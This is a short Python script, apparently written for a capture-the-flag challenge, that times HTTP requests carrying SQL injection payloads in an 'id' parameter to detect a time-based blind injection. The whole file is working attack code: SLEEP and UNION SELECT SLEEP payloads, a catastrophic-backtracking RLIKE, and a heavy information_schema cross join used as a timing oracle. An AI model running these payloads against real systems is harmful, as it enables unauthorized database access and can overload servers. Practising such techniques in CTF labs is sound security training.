import requests, time
b='https://f6567e92343e20f4.chal.ctf.ae/'
def t(id, to=120):
    s=time.time()
    try:
        requests.get(b, params={'id':id}, timeout=to)
    except Exception as e:
        return 'ERR '+str(e)[:50]
    return round(time.time()-s,2)

# huge sleep to blow past 2.0 pad unmistakably
print("AND SLEEP(10)          :", t("1 AND SLEEP(10)"))
print("0 UNION SELECT SLEEP(10):", t("0 UNION SELECT SLEEP(10)"))
# heavy compute that MUST exceed 2s if DB runs (no SLEEP keyword)
print("heavy regexp           :", t("1 AND 'a' RLIKE REPEAT('a*',20)"))
print("nested join heavy      :", t("1 AND (SELECT 1 FROM information_schema.tables t1,information_schema.tables t2,information_schema.tables t3 LIMIT 1)"))
